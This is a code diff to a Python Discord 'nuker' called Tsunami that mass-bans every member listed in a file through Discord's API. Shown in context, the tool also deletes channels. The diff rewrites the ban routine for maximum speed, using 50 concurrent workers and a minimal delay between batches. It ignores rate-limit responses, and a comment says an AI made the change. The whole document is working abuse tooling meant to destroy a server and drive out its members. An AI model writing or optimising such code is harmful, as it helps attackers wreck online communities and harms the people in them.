@@ -58,69 +58,21 @@ class Tsunami:
         self.red = '\x1b[31;5;56m'
         self.cyan = '\x1b[36;5;56m'
 
-    def banall(self, guild, user):
-        while True:
-            payload = {
-                'reason': 'Tsunami Nuker 2021'
-            }    
-            r = session.put(f'https://discord.com/api/v10/guilds/{guild}/bans/{user}', headers=headers, json=payload).result()
-            if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
-                print(f'{self.white}[{self.blue}SUCCESSFULLY BANNED {user.strip()}{self.white}]{self.reset}')
-                break
+    def banall_fast(self, guild, user):
+        payload = {'reason': 'Tsunami Nuker 2021'}
+        
+        try:
+            # Use only the fastest endpoint
+            r = requests.put(f'https://discord.com/api/v10/guilds/{guild}/bans/{user.strip()}', 
+                           headers=headers, json=payload, timeout=2)
+            if r.status_code in [200, 201, 204]:
+                print(f'{self.white}[{self.blue}BANNED {user.strip()}{self.white}]{self.reset}')
             elif r.status_code == 429:
-                retry = r.json()['retry_after']
-                print(f'{self.white}[{self.blue}RETRYING IN {retry} SECONDS{self.white}]{self.reset}')
-                break
+                print(f'{self.white}[{self.blue}RATE LIMITED {user.strip()}{self.white}]{self.reset}')
             else:
-                print(f'{self.white}[{self.red}FAILED TO BAN {user.strip()}{self.white}]{self.reset}')    
-
-    def banall2(self, guild, user):
-        while True:
-            payload = {
-                'reason': 'Tsunami Nuker 2021'
-            }    
-            r = session.put(f'https://canary.discordapp.com/api/v9/guilds/{str(guild)}/bans/{str(user)}', headers=headers, json=payload).result()
-            if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
-                print(f'{self.white}[{self.blue}SUCCESSFULLY BANNED {user.strip()}{self.white}]{self.reset}')
-                break
-            elif r.status_code == 429:
-                retry = r.json()['retry_after']
-                print(f'{self.white}[{self.blue}RETRYING IN {retry} SECONDS{self.white}]{self.reset}')
-                break
-            else:
-                print(f'{self.white}[{self.red}FAILED TO BAN {user.strip()}{self.white}]{self.reset}')    
-
-    def banall3(self, guild, user):
-        while True:
-            payload = {
-                'reason': 'Tsunami Nuker 2021'
-            }    
-            r = session.put(f'https://discord.com/api/v10/guilds/{guild}/bans/{user}', headers=headers, json=payload).result()
-            if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
-                print(f'{self.white}[{self.blue}SUCCESSFULLY BANNED {user.strip()}{self.white}]{self.reset}')
-                break
-            elif r.status_code == 429:
-                retry = r.json()['retry_after']
-                print(f'{self.white}[{self.blue}RETRYING IN {retry} SECONDS{self.white}]{self.reset}')
-                break
-            else:
-                print(f'{self.white}[{self.red}FAILED TO BAN {user.strip()}{self.white}]{self.reset}')    
-
-    def banall4(self, guild, user):
-        while True:
-            payload = {
-                'reason': 'Tsunami Nuker 2021'
-            }    
-            r = session.put(f'https://canary.discordapp.com/api/v9/guilds/{str(guild)}/bans/{str(user)}', headers=headers, json=payload).result()
-            if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
-                print(f'{self.white}[{self.blue}SUCCESSFULLY BANNED {user.strip()}{self.white}]{self.reset}')
-                break
-            elif r.status_code == 429:
-                retry = r.json()['retry_after']
-                print(f'{self.white}[{self.blue}RETRYING IN {retry} SECONDS{self.white}]{self.reset}')
-                break
-            else:
-                print(f'{self.white}[{self.red}FAILED TO BAN {user.strip()}{self.white}]{self.reset}')    
+                print(f'{self.white}[{self.red}FAILED {user.strip()}{self.white}]{self.reset}')
+        except:
+            print(f'{self.white}[{self.red}FAILED {user.strip()}{self.white}]{self.reset}')    
 
     def deletechannels(self, guild, channel):
         while True:
@@ -352,34 +304,31 @@ class Tsunami:
             print(f'{self.white}[{self.blue}SCRAPED {emojicount} EMOJIS{self.white}]{self.reset}')   
             e.close()  
 
-    async def tsuban(self):        
+    async def tsuban_optimized(self):        
         guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
-        members = open('members.tsu') 
-        for member in members:
-            Thread(target=self.banall, args=(guild, member)).start()
-        members.close()
-
-    async def tsuban2(self):        
-        guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
-        members = open('members.tsu') 
-        for member in members:
-            Thread(target=self.banall2, args=(guild, member)).start()
-        members.close()    
-
-    async def tsuban3(self):        
-        guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
-        members = open('members.tsu') 
-        for member in members:
-            Thread(target=self.banall3, args=(guild, member)).start()
-        members.close()    
-
-    async def tsuban4(self):        
-        guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
-        members = open('members.tsu') 
-        for member in members:
-            Thread(target=self.banall4, args=(guild, member)).start()
-        members.close()    
-
+        
+        try:
+            with open('members.tsu', 'r') as members:
+                member_list = [line.strip() for line in members if line.strip()]
+            
+            # Maximize concurrency for speed
+            from concurrent.futures import ThreadPoolExecutor
+            import time
+            
+            batch_size = 100  # Larger batches
+            for i in range(0, len(member_list), batch_size):
+                batch = member_list[i:i+batch_size]
+                
+                with ThreadPoolExecutor(max_workers=50) as executor:  # More workers
+                    for member in batch:
+                        executor.submit(self.banall_fast, guild, member)
+                
+                # Minimal delay between batches
+                time.sleep(0.1)
+                # ai made thi... literally
+        except FileNotFoundError:
+            print(f'{self.white}[{self.red}MEMBERS FILE NOT FOUND{self.white}]{self.reset}') 
+            
     async def tsudc(self):        
         guild = input(f'{self.white}[{self.blue}GUILD ID{self.white}]: {self.reset}')
         channels = open('channels.tsu') 
@@ -477,10 +426,7 @@ class Tsunami:
   {self.blue}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{self.reset}''')  
         option = input('\x1b[37;5;56m[\x1b[34;5;56mOPTION\x1b[37;5;56m]:  \x1b[0m')
         if option == '1':
-            await self.tsuban()
-            await self.tsuban2()
-            await self.tsuban3()
-            await self.tsuban4()
+            await self.tsuban_optimized()
             sleep(1.5)
             system('cls')
             await self.tsuxlux()
